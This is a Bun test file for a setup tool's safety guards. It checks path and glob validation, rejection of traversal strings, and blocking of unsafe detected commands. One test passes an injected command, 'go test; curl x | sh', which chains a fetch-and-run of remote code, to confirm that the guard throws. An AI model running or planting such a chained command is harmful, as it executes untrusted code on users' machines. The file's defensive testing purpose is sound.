import { expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { isCommandSafe } from "../../src/setup/command-safety.ts";
import { runRegistry } from "../../src/setup/detect-components.ts";
import type { LangDef } from "../../src/setup/lang/types.ts";
import { isSafePath, safeMember } from "../../src/setup/manifests.ts";
import { REGISTRY } from "../../src/setup/registry.ts";

function fixture(files: Record<string, string>): string {
  const root = mkdtempSync(join(tmpdir(), "styre-eng-"));
  for (const [rel, content] of Object.entries(files)) {
    const p = join(root, rel);
    mkdirSync(join(p, ".."), { recursive: true });
    writeFileSync(p, content);
  }
  return root;
}

test("isSafePath: allows lone ** and anchored globs; rejects leading-slash / unanchored / traversal", () => {
  for (const ok of ["**", "src/**", "Cargo.toml", "pkgs/api/**", "crates/**"])
    expect(isSafePath(ok)).toBe(true);
  for (const bad of ["/**", "/abs/**", "*/**", "*", "**/*.ts", "a/../b", "a/ ../b", "./x", "a//b"])
    expect(isSafePath(bad)).toBe(false);
});

test("safeMember: keeps real members, rejects the defeating strings", () => {
  for (const ok of ["src-tauri", "crates/a", "crates/*"]) expect(safeMember(ok)).toBe(true);
  for (const bad of ["", "*", "**", "../escape", "/abs", "//x", "a/ ../b", "a/.. /b", ".", "./x"])
    expect(safeMember(bad)).toBe(false);
});

test("runRegistry: Invariant 1 THROWS on a metachar machine command", () => {
  const evil: LangDef = {
    kind: "x",
    detect: () => [
      { name: "b", kind: "x", paths: ["b/**"], commands: { test: "go test; curl x | sh" } },
    ],
  };
  expect(() => runRegistry("/tmp/x", [evil])).toThrow(/unsafe command/i);
});

test("runRegistry: Invariant 2 filters unsafe paths and drops zero-path components", () => {
  const def: LangDef = {
    kind: "x",
    detect: () => [
      {
        name: "keep",
        kind: "x",
        paths: ["src/**", "*/**", "/abs/**"],
        commands: { test: "go test ./..." },
      },
      { name: "gone", kind: "x", paths: ["*", "../x"], commands: { test: "go test ./..." } },
    ],
  };
  const out = runRegistry("/tmp/x", [def]);
  expect(out.map((c) => c.name)).toEqual(["keep"]);
  expect(out[0].paths).toEqual(["src/**"]); // unsafe globs stripped
});

test("CONFORMANCE: every registry def over an adversarial polyglot fixture emits only safe commands + anchored paths", () => {
  const root = fixture({
    "Cargo.toml": '[workspace]\nmembers = ["*","../x","/abs","ok"]\n',
    "package.json": JSON.stringify({ scripts: { test: "x" } }),
    "go.mod": "module x\n",
    "pyproject.toml": "[project]\n",
  });
  for (const def of REGISTRY) {
    for (const c of def.detect(root)) {
      for (const v of Object.values(c.commands))
        if (typeof v === "string") expect(isCommandSafe(v)).toBe(true);
      for (const p of c.paths) expect(isSafePath(p)).toBe(true); // reuse the engine guard as the oracle
    }
  }
});
